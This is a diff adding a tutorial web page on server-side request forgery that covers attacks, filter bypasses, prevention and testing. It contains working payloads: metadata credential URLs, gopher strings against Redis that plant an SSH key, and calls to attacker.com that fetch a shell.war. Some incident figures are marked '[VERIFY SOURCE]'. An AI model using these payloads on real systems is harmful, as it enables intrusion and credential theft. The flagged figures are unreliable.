@@ -1,0 +1,1045 @@
+<!-- GENERATED: follow sql-injection-learn-more.html template. Created by copilot script. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF (Server-Side Request Forgery) - Comprehensive Guide</title>
+    <link rel="stylesheet" href="../../src/web-assets/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css">
+    <style>
+        .learn-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        
+        .back-nav:hover {
+            background-color: rgba(0, 255, 65, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .page-header {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), rgba(13, 255, 146, 0.05));
+            border-radius: 12px;
+            margin-bottom: 50px;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+        }
+        
+        .page-header h1 {
+            color: var(--primary-color);
+            font-size: 3rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+        
+        .page-header p {
+            color: var(--text-secondary);
+            font-size: 1.3rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .content-section {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 40px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(0, 255, 65, 0.1);
+        }
+        
+        .content-section:hover {
+            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.15);
+        }
+        
+        .content-section h2 {
+            color: var(--primary-color);
+            font-size: 2rem;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .content-section h2:before {
+            content: "▸";
+            color: var(--secondary-color);
+            font-size: 2.5rem;
+        }
+        
+        .content-section h3 {
+            color: var(--secondary-color);
+            font-size: 1.5rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        
+        .content-section h4 {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 12px;
+        }
+        
+        .content-section p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+        
+        .content-section ul, .content-section ol {
+            margin-left: 25px;
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+        
+        .content-section li {
+            margin-bottom: 12px;
+            line-height: 1.7;
+        }
+        
+        .content-section li strong {
+            color: var(--secondary-color);
+        }
+        
+        .content-section code {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 3px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            border: 1px solid var(--border-color);
+        }
+        
+        .content-section pre {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 25px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+        
+        .content-section pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--text-color);
+            font-size: 0.95em;
+        }
+        
+        .content-section a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--secondary-color);
+            transition: all 0.3s;
+        }
+        
+        .content-section a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+        
+        .content-section strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+        
+        .warning-box {
+            background: rgba(255, 49, 49, 0.1);
+            border-left: 4px solid #ff3131;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        
+        .warning-box h4 {
+            color: #ff3131;
+            margin-top: 0;
+        }
+        
+        .success-box {
+            background: rgba(0, 255, 65, 0.1);
+            border-left: 4px solid var(--primary-color);
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        
+        .success-box h4 {
+            color: var(--primary-color);
+            margin-top: 0;
+        }
+        
+        .toc {
+            background: rgba(0, 255, 65, 0.05);
+            border: 2px solid var(--primary-color);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .toc h3 {
+            color: var(--primary-color);
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+        
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+        
+        .toc li {
+            margin-bottom: 10px;
+        }
+        
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px;
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+        
+        .toc a:hover {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--primary-color);
+            padding-left: 15px;
+        }
+        
+        .toc a:before {
+            content: "→";
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="learn-container">
+        <a href="../index.html" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back to Attack Flows
+        </a>
+        
+        <div class="page-header">
+            <h1><i class="fas fa-network-wired"></i> SSRF (Server-Side Request Forgery) - Comprehensive Guide</h1>
+            <p>Complete guide to understanding, exploiting, and preventing Server-Side Request Forgery attacks</p>
+        </div>
+        
+        <div class="toc">
+            <h3><i class="fas fa-list"></i> Table of Contents</h3>
+            <ul>
+                <li><a href="#section-0">What is SSRF?</a></li>
+                <li><a href="#section-1">How SSRF Works</a></li>
+                <li><a href="#section-2">Advanced Attack Techniques</a></li>
+                <li><a href="#section-3">Defense Bypass Strategies</a></li>
+                <li><a href="#section-4">Prevention & Mitigation</a></li>
+                <li><a href="#section-5">Detection & Testing</a></li>
+                <li><a href="#section-6">Real-World Examples</a></li>
+                <li><a href="#section-7">Quick Reference</a></li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-0">
+            <h2>What is SSRF?</h2>
+
+<p>Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. When exploited, SSRF can enable attackers to:</p>
+
+<ul>
+    <li><strong>Access internal services:</strong> Reach services behind firewalls or in private networks</li>
+    <li><strong>Read cloud metadata:</strong> Extract sensitive cloud instance metadata (AWS, Azure, GCP)</li>
+    <li><strong>Port scanning:</strong> Map internal network infrastructure</li>
+    <li><strong>Bypass access controls:</strong> Access admin interfaces restricted to localhost</li>
+    <li><strong>Execute remote code:</strong> Exploit vulnerable internal services</li>
+    <li><strong>Data exfiltration:</strong> Read local files or internal databases</li>
+</ul>
+
+<h3>Why is it Critical?</h3>
+<p>SSRF has become increasingly dangerous in cloud environments and is part of the OWASP Top 10 (#10 in 2021). It's critical because:</p>
+
+<ul>
+    <li>Can lead to <strong>complete cloud infrastructure compromise</strong></li>
+    <li>Enables <strong>lateral movement</strong> within internal networks</li>
+    <li>Bypasses <strong>network segmentation and firewalls</strong></li>
+    <li>Particularly dangerous in <strong>microservices architectures</strong></li>
+    <li>Can expose <strong>cloud credentials and API keys</strong></li>
+    <li>Often underestimated by developers</li>
+</ul>
+
+        </div>
+        
+        <div class="content-section" id="section-1">
+            <h2>How SSRF Works</h2>
+
+<h3>The Vulnerable Pattern</h3>
+<p>SSRF occurs when an application fetches a remote resource based on user-supplied input without proper validation:</p>
+
+<pre><code class="language-python"># VULNERABLE CODE
+from flask import Flask, request
+import requests
+
+app = Flask(__name__)
+
+@app.route('/fetch')
+def fetch_url():
+    # User controls the URL - DANGEROUS!
+    url = request.args.get('url')
+    response = requests.get(url)
+    return response.text
+</code></pre>
+
+<h3>The Attack</h3>
+<p>An attacker provides a URL pointing to internal resources or cloud metadata endpoints:</p>
+
+<pre><code># Legitimate use:
+GET /fetch?url=https://example.com/image.jpg
+
+# Attack - Access AWS metadata:
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Attack - Access internal service:
+GET /fetch?url=http://localhost:8080/admin/delete-all-users
+
+# Attack - Read local files (if supported):
+GET /fetch?url=file:///etc/passwd
+</code></pre>
+
+<h3>Attack Types</h3>
+
+<h4>1. Basic SSRF</h4>
+<p>Direct response is returned to the attacker:</p>
+<ul>
+    <li><strong>Full response SSRF:</strong> Complete response visible to attacker
+        <pre><code>http://example.com/proxy?url=http://internal-api/users</code></pre>
+    </li>
+    <li><strong>Partial response SSRF:</strong> Limited information leaked
+        <pre><code>http://example.com/avatar?url=http://localhost/admin</code></pre>
+    </li>
+</ul>
+
+<h4>2. Blind SSRF</h4>
+<p>No direct response, attacker must use out-of-band techniques:</p>
+<ul>
+    <li><strong>Time-based:</strong> Measure response time to infer success
+        <pre><code># Internal service responds quickly
+?url=http://192.168.1.5:80
+
+# Non-existent host times out
+?url=http://192.168.1.99:80</code></pre>
+    </li>
+    <li><strong>Out-of-band:</strong> Use external callbacks
+        <pre><code>?url=http://attacker.com/callback</code></pre>
+    </li>
+</ul>
+
+<h4>3. Semi-Blind SSRF</h4>
+<p>Partial information leakage through error messages or status codes:</p>
+<pre><code># Different errors reveal information
+200 OK - Service exists and responded
+404 Not Found - Service exists but endpoint invalid
+Connection Timeout - Host/port unreachable
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-2">
+            <h2>Advanced Attack Techniques</h2>
+
+<h3>1. Cloud Metadata Exploitation</h3>
+<pre><code class="language-bash"># AWS - Instance Metadata Service (IMDSv1)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
+
+# AWS - User data (may contain secrets)
+http://169.254.169.254/latest/user-data
+
+# Google Cloud Platform
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Requires header: Metadata-Flavor: Google
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Requires header: Metadata: true
+
+# Digital Ocean
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1.json
+</code></pre>
+
+<h3>2. Internal Network Reconnaissance</h3>
+<pre><code class="language-python"># Port scanning
+for port in range(1, 1000):
+    url = f"http://192.168.1.5:{port}"
+    # Check response time or status
+
+# Common internal targets
+http://localhost:80        # Web server
+http://localhost:8080      # Application server
+http://localhost:3306      # MySQL
+http://localhost:5432      # PostgreSQL
+http://localhost:6379      # Redis
+http://localhost:9200      # Elasticsearch
+http://127.0.0.1:8443      # Admin interface
+
+# Private network ranges
+http://10.0.0.0/8
+http://172.16.0.0/12
+http://192.168.0.0/16
+</code></pre>
+
+<h3>3. Protocol Smuggling</h3>
+<p>Exploiting different URL schemes:</p>
+<pre><code># File protocol (read local files)
+file:///etc/passwd
+file:///c:/windows/win.ini
+
+# Gopher protocol (can send arbitrary TCP data)
+gopher://localhost:6379/_SET%20key%20value
+
+# Dict protocol (probe services)
+dict://localhost:11211/stats
+
+# LDAP protocol
+ldap://localhost:389/%0astats%0aquit
+
+# SFTP/FTP
+ftp://internal-ftp-server/
+sftp://internal-server/
+</code></pre>
+
+<h3>4. SSRF to Remote Code Execution</h3>
+<pre><code class="language-bash"># Redis exploitation via Gopher
+gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
+
+# Exploit internal Tomcat manager
+http://internal-tomcat:8080/manager/deploy?war=http://attacker.com/shell.war
+
+# Memcached exploitation
+gopher://localhost:11211/_set%20payload%200%200%2010%0d%0amalicious
+
+# Exploiting internal services
+http://internal-jenkins/script
+http://internal-docker/containers/json
+</code></pre>
+
+<h3>5. SSRF Chain Attacks</h3>
+<pre><code># Step 1: SSRF to access internal admin panel
+http://internal-admin/create-user
+
+# Step 2: Use created user to access higher privileges
+http://internal-admin/grant-admin?user=attacker
+
+# Step 3: Use admin to deploy malicious code
+http://internal-admin/deploy?url=http://attacker.com/shell.war
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-3">
+            <h2>Defense Bypass Strategies</h2>
+
+<h3>Bypassing URL Validation</h3>
+
+<h4>1. Alternative IP Encodings</h4>
+<pre><code># Decimal encoding
+http://2130706433/  = http://127.0.0.1/
+
+# Octal encoding
+http://0177.0.0.1/  = http://127.0.0.1/
+
+# Hexadecimal encoding
+http://0x7f.0x0.0x0.0x1/  = http://127.0.0.1/
+
+# Mixed encoding
+http://0177.0.0.1/  = http://127.0.0.1/
+
+# Integer conversion
+http://3232235777/  = http://192.168.1.1/
+
+# IPv6
+http://[::1]/  = http://localhost/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+</code></pre>
+
+<h4>2. DNS Rebinding</h4>
+<pre><code># Setup DNS that resolves to different IPs
+# First request: Returns whitelisted IP (8.8.8.8)
+# Second request: Returns internal IP (192.168.1.1)
+
+# Attacker's DNS:
+attacker.com -> 8.8.8.8 (TTL: 0)
+attacker.com -> 192.168.1.1 (on next lookup)
+</code></pre>
+
+<h4>3. URL Parser Confusion</h4>
+<pre><code># @ character tricks
+http://expected-host@internal-host/
+http://expected-host%00@internal-host/
+
+# Backslash vs forward slash
+http://expected-host\@internal-host/
+
+# URL encoding
+http://127.0.0.1%23@expected-host/
+http://expected-host#@127.0.0.1/
+
+# Open redirect abuse
+http://trusted-site.com/redirect?url=http://169.254.169.254/
+
+# Unicode/IDN homograph
+http://127.0.0.1  (using Cyrillic characters)
+</code></pre>
+
+<h4>4. Bypassing Blacklists</h4>
+<pre><code># If "127.0.0.1" is blacklisted:
+http://localhost/
+http://0.0.0.0/
+http://127.1/
+http://127.0.1/
+http://[::1]/
+http://2130706433/
+
+# If "localhost" is blacklisted:
+http://localtest.me/  (resolves to 127.0.0.1)
+http://127.0.0.1.nip.io/
+http://vcap.me/
+http://lvh.me/
+
+# If "169.254.169.254" is blacklisted:
+http://[::ffff:169.254.169.254]/
+http://0251.0376.0251.0376/  (octal)
+http://instance-data/  (AWS link-local name)
+</code></pre>
+
+<h4>5. Scheme Manipulation</h4>
+<pre><code># Mixed case
+FILE:///etc/passwd
+HtTp://localhost/
+
+# Alternative protocols
+jar:http://internal-host!/
+tftp://internal-host/
+php://filter/convert.base64-encode/resource=http://internal
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-4">
+            <h2>Prevention & Mitigation</h2>
+
+<h3>1. URL Allowlisting (Recommended)</h3>
+<p>✅ <strong>THE PRIMARY DEFENSE</strong></p>
+
+<pre><code class="language-python">from urllib.parse import urlparse
+
+ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']
+ALLOWED_SCHEMES = ['https']
+
+def is_safe_url(url):
+    try:
+        parsed = urlparse(url)
+        
+        # Check scheme
+        if parsed.scheme not in ALLOWED_SCHEMES:
+            return False
+        
+        # Check hostname
+        if parsed.hostname not in ALLOWED_HOSTS:
+            return False
+        
+        # Check for username (@ tricks)
+        if parsed.username:
+            return False
+            
+        return True
+    except Exception:
+        return False
+
+# Usage
+url = request.args.get('url')
+if is_safe_url(url):
+    response = requests.get(url, timeout=5)
+else:
+    abort(400, "Invalid URL")
+</code></pre>
+
+<h3>2. Deny Private IP Ranges</h3>
+<pre><code class="language-python">import ipaddress
+
+def is_private_ip(hostname):
+    """Check if hostname resolves to private IP"""
+    try:
+        ip = ipaddress.ip_address(hostname)
+        return (
+            ip.is_private or
+            ip.is_loopback or
+            ip.is_link_local or
+            ip.is_multicast or
+            ip.is_reserved
+        )
+    except ValueError:
+        # Not an IP, resolve hostname
+        import socket
+        try:
+            resolved_ip = socket.gethostbyname(hostname)
+            return is_private_ip(resolved_ip)
+        except socket.gaierror:
+            return True  # Deny if can't resolve
+
+# Usage
+parsed = urlparse(url)
+if is_private_ip(parsed.hostname):
+    abort(400, "Access to private IPs is forbidden")
+</code></pre>
+
+<h3>3. Use Indirect Reference Maps</h3>
+<pre><code class="language-python"># Instead of accepting URLs, use IDs
+ALLOWED_RESOURCES = {
+    '1': 'https://api.example.com/data1',
+    '2': 'https://cdn.example.com/image1.jpg',
+    '3': 'https://partner.com/resource'
+}
+
+@app.route('/fetch')
+def fetch_resource():
+    resource_id = request.args.get('id')
+    
+    if resource_id not in ALLOWED_RESOURCES:
+        abort(400, "Invalid resource ID")
+    
+    url = ALLOWED_RESOURCES[resource_id]
+    response = requests.get(url, timeout=5)
+    return response.text
+</code></pre>
+
+<h3>4. Network Segmentation</h3>
+<pre><code class="language-yaml"># Docker network isolation
+version: '3'
+services:
+  web:
+    networks:
+      - public
+    # Cannot access internal services
+  
+  internal-api:
+    networks:
+      - internal
+    # Not accessible from web service
+
+networks:
+  public:
+  internal:
+</code></pre>
+
+<h3>5. Disable Unnecessary URL Schemes</h3>
+<pre><code class="language-python">import requests
+
+# Create custom session with restricted protocols
+session = requests.Session()
+session.mount('file://', None)  # Disable file://
+session.mount('ftp://', None)   # Disable ftp://
+session.mount('gopher://', None)  # Disable gopher://
+
+# Only allow HTTP/HTTPS
+if not url.startswith(('http://', 'https://')):
+    abort(400, "Invalid protocol")
+
+response = session.get(url, timeout=5)
+</code></pre>
+
+<h3>6. Implement Response Validation</h3>
+<pre><code class="language-python">def fetch_url_safely(url):
+    # Validate URL first
+    if not is_safe_url(url):
+        abort(400)
+    
+    try:
+        # Set timeout
+        response = requests.get(
+            url,
+            timeout=5,
+            allow_redirects=False,  # Prevent redirect bypass
+            stream=True
+        )
+        
+        # Check content type
+        content_type = response.headers.get('Content-Type', '')
+        if 'image/' not in content_type:
+            abort(400, "Invalid content type")
+        
+        # Limit response size
+        max_size = 10 * 1024 * 1024  # 10MB
+        if int(response.headers.get('Content-Length', 0)) > max_size:
+            abort(400, "File too large")
+        
+        return response.content
+        
+    except requests.RequestException:
+        abort(500, "Failed to fetch resource")
+</code></pre>
+
+<h3>7. Use AWS IMDSv2</h3>
+<pre><code class="language-bash"># AWS IMDSv2 requires session token (prevents SSRF)
+aws ec2 modify-instance-metadata-options \
+    --instance-id i-1234567890abcdef0 \
+    --http-tokens required \
+    --http-put-response-hop-limit 1
+</code></pre>
+
+<h3>8. Firewall Rules</h3>
+<pre><code class="language-bash"># Block access to metadata service from application servers
+iptables -A OUTPUT -d 169.254.169.254 -j DROP
+
+# Allow only specific services to access internal network
+iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
+iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
+iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-5">
+            <h2>Detection & Testing</h2>
+
+<h3>Manual Testing Techniques</h3>
+
+<h4>1. Basic SSRF Test</h4>
+<pre><code># Test if server makes requests
+# Use a service like webhook.site or Burp Collaborator
+?url=http://YOUR-CALLBACK-URL.com
+
+# Test localhost access
+?url=http://localhost/
+?url=http://127.0.0.1/
+
+# Test metadata endpoints
+?url=http://169.254.169.254/latest/meta-data/
+</code></pre>
+
+<h4>2. Port Scanning Test</h4>
+<pre><code># Test different ports
+?url=http://localhost:22    # SSH - should timeout or refuse
+?url=http://localhost:80    # HTTP - should respond
+?url=http://localhost:443   # HTTPS
+?url=http://localhost:3306  # MySQL
+?url=http://localhost:6379  # Redis
+
+# Measure response times to identify open ports
+</code></pre>
+
+<h4>3. Protocol Testing</h4>
+<pre><code># Test different schemes
+?url=file:///etc/passwd
+?url=gopher://localhost:6379/
+?url=dict://localhost:11211/
+?url=ftp://internal-ftp/
+</code></pre>
+
+<h3>Automated Testing Tools</h3>
+
+<h4>SSRFmap</h4>
+<p>Comprehensive SSRF exploitation tool:</p>
+
+<pre><code class="language-bash"># Install
+git clone https://github.com/swisskyrepo/SSRFmap
+cd SSRFmap
+pip install -r requirements.txt
+
+# Basic scan
+python ssrfmap.py -r request.txt -p url
+
+# With specific module
+python ssrfmap.py -r request.txt -p url -m readfiles
+
+# AWS metadata exploitation
+python ssrfmap.py -r request.txt -p url -m aws
+</code></pre>
+
+<h4>Burp Suite</h4>
+<ul>
+    <li><strong>Collaborator:</strong> Detect blind SSRF with out-of-band callbacks</li>
+    <li><strong>Intruder:</strong> Fuzz URL parameters with payloads</li>
+    <li><strong>Scanner:</strong> Automated SSRF detection</li>
+</ul>
+
+<h4>OWASP ZAP</h4>
+<ul>
+    <li>Active scanner with SSRF detection</li>
+    <li>Fuzzing capabilities</li>
+    <li>Custom payloads</li>
+</ul>
+
+<h4>Interactsh</h4>
+<pre><code class="language-bash"># Self-hosted out-of-band interaction server
+# Install
+GO111MODULE=on go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+
+# Start client
+interactsh-client
+
+# Use the generated URL in SSRF tests
+?url=http://GENERATED-ID.interact.sh
+</code></pre>
+
+<h3>Code Review Patterns</h3>
+<p>Search for these vulnerable patterns:</p>
+
+<pre><code class="language-bash"># Python
+grep -r "requests.get.*request\." .
+grep -r "urllib.request.*request\." .
+grep -r "httplib.*request\." .
+
+# Node.js
+grep -r "http.get.*req\." .
+grep -r "axios.*req\." .
+grep -r "fetch.*req\." .
+
+# PHP
+grep -r "file_get_contents.*\$_" .
+grep -r "curl_exec.*\$_" .
+grep -r "fopen.*\$_" .
+
+# Java
+grep -r "URL.*request" .
+grep -r "HttpClient.*request" .
+</code></pre>
+
+<h3>Security Headers Testing</h3>
+<pre><code class="language-bash"># Check if metadata endpoints require headers
+curl http://169.254.169.254/latest/meta-data/
+# Should fail without proper headers
+
+# Google Cloud requires header
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/
+
+# Azure requires header
+curl -H "Metadata: true" http://169.254.169.254/metadata/instance
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-6">
+            <h2>Real-World Examples</h2>
+
+<h3>Notable Incidents</h3>
+
+<h4>1. Capital One Breach (2019)</h4>
+<ul>
+    <li><strong>Impact:</strong> [VERIFY SOURCE] 100+ million customer records exposed</li>
+    <li><strong>Method:</strong> SSRF to access AWS metadata service and obtain IAM credentials</li>
+    <li><strong>Outcome:</strong> [VERIFY SOURCE] $80 million fine, significant reputational damage</li>
+    <li><strong>Root cause:</strong> Misconfigured web application firewall + SSRF vulnerability</li>
+</ul>
+
+<h4>2. Vend (2017)</h4>
+<ul>
+    <li><strong>Impact:</strong> [VERIFY SOURCE] Access to internal AWS services and metadata</li>
+    <li><strong>Method:</strong> SSRF in PDF generator that accepted URLs</li>
+    <li><strong>Discovery:</strong> Responsible disclosure via bug bounty</li>
+</ul>
+
+<h4>3. Uber (2016)</h4>
+<ul>
+    <li><strong>Impact:</strong> [VERIFY SOURCE] Access to internal services</li>
+    <li><strong>Method:</strong> SSRF in image upload functionality</li>
+    <li><strong>Bounty:</strong> [VERIFY SOURCE] $10,000 reward</li>
+</ul>
+
+<h4>4. Google (Multiple Findings)</h4>
+<ul>
+    <li><strong>Impact:</strong> [VERIFY SOURCE] Access to internal Google services</li>
+    <li><strong>Method:</strong> SSRF in various Google products (Docs, Cloud, etc.)</li>
+    <li><strong>Bounties:</strong> [VERIFY SOURCE] Multiple high-value bug bounty rewards</li>
+</ul>
+
+<h3>Common Vulnerable Features</h3>
+
+<ul>
+    <li><strong>Image/PDF generators:</strong> Accept URLs for conversion or rendering</li>
+    <li><strong>Webhook integrations:</strong> Allow users to specify callback URLs</li>
+    <li><strong>URL preview/unfurling:</strong> Fetch metadata from user-provided URLs</li>
+    <li><strong>Document parsers:</strong> Process files with external references (XML, SVG, Office docs)</li>
+    <li><strong>Proxy services:</strong> Forward requests on behalf of users</li>
+    <li><strong>Import functions:</strong> Fetch data from external sources</li>
+    <li><strong>Avatar/profile image uploads:</strong> Fetch images from URLs</li>
+    <li><strong>RSS/Feed readers:</strong> Fetch and parse external feeds</li>
+</ul>
+
+<h3>Attack Scenarios</h3>
+
+<h4>Scenario 1: AWS Credential Theft</h4>
+<pre><code># Step 1: Identify SSRF in image upload
+POST /api/upload
+{
+  "image_url": "http://169.254.169.254/latest/meta-data/"
+}
+
+# Step 2: Enumerate IAM roles
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Step 3: Extract credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole
+
+# Step 4: Use credentials to access AWS services
+aws s3 ls --profile stolen-creds
+</code></pre>
+
+<h4>Scenario 2: Redis Exploitation via Gopher</h4>
+<pre><code># Craft Gopher payload to write SSH key to Redis
+?url=gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0d%0a%0d%0assh-rsa%20AAAAB3...%0d%0a%0d%0a%0d%0a*4%0d%0a...
+
+# This writes attacker's SSH key allowing server access
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-7">
+            <h2>Quick Reference</h2>
+
+<h3>Common Target URLs</h3>
+<pre><code># Cloud Metadata Services
+http://169.254.169.254/latest/meta-data/               # AWS
+http://metadata.google.internal/computeMetadata/v1/   # GCP
+http://169.254.169.254/metadata/instance               # Azure
+
+# Localhost variations
+http://localhost/
+http://127.0.0.1/
+http://0.0.0.0/
+http://[::1]/
+http://127.1/
+http://2130706433/
+
+# Private network ranges
+http://10.0.0.1/
+http://172.16.0.1/
+http://192.168.1.1/
+
+# Common internal services
+http://localhost:6379/    # Redis
+http://localhost:3306/    # MySQL
+http://localhost:5432/    # PostgreSQL
+http://localhost:9200/    # Elasticsearch
+http://localhost:8080/    # Admin panels
+http://localhost:27017/   # MongoDB
+</code></pre>
+
+<h3>Bypass Techniques Cheat Sheet</h3>
+<pre><code># IP encoding
+127.0.0.1 = 0177.0.0.1 (octal)
+127.0.0.1 = 0x7f.0x0.0x0.0x1 (hex)
+127.0.0.1 = 2130706433 (decimal)
+127.0.0.1 = 127.1 (shorthand)
+
+# URL tricks
+http://expected@internal/
+http://expected%00@internal/
+http://expected\@internal/
+
+# DNS aliases (resolve to 127.0.0.1)
+http://localtest.me/
+http://127.0.0.1.nip.io/
+http://vcap.me/
+http://lvh.me/
+http://sslip.io/
+
+# IPv6
+http://[::1]/
+http://[::ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+</code></pre>
+
+<h3>Testing Checklist</h3>
+<ul>
+    <li>☐ Test all URL parameters and fields</li>
+    <li>☐ Try accessing localhost (127.0.0.1, localhost, 0.0.0.0)</li>
+    <li>☐ Test cloud metadata endpoints (AWS, GCP, Azure)</li>
+    <li>☐ Attempt to access private IP ranges</li>
+    <li>☐ Test alternative protocols (file://, gopher://, dict://)</li>
+    <li>☐ Try IP encoding variations</li>
+    <li>☐ Test URL parser bypasses (@, #, \)</li>
+    <li>☐ Check for blind SSRF using callback services</li>
+    <li>☐ Test redirect following behavior</li>
+    <li>☐ Scan internal ports via timing differences</li>
+</ul>
+
+<h3>Prevention Checklist</h3>
+<ul>
+    <li>☐ Implement strict URL allowlisting</li>
+    <li>☐ Block private IP ranges and localhost</li>
+    <li>☐ Validate and parse URLs properly</li>
+    <li>☐ Disable unnecessary URL schemes</li>
+    <li>☐ Disable HTTP redirects or validate redirect targets</li>
+    <li>☐ Use network segmentation</li>
+    <li>☐ Enable AWS IMDSv2 (token-based)</li>
+    <li>☐ Implement firewall rules blocking metadata endpoints</li>
+    <li>☐ Set strict timeouts on outbound requests</li>
+    <li>☐ Use indirect reference maps instead of direct URLs</li>
+    <li>☐ Sanitize responses and error messages</li>
+    <li>☐ Regular security testing and code review</li>
+</ul>
+
+<h3>Resources</h3>
+<ul>
+    <li><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">OWASP SSRF</a></li>
+    <li><a href="https://portswigger.net/web-security/ssrf">PortSwigger SSRF</a></li>
+    <li><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap Tool</a></li>
+    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP SSRF Prevention Cheat Sheet</a></li>
+    <li><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">HackTricks SSRF</a></li>
+</ul>
+
+        </div>
+        
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
+</body>
+</html>
+
+<!-- TODO: Verify the following items:
+- Capital One breach details (exact number of records, fine amount)
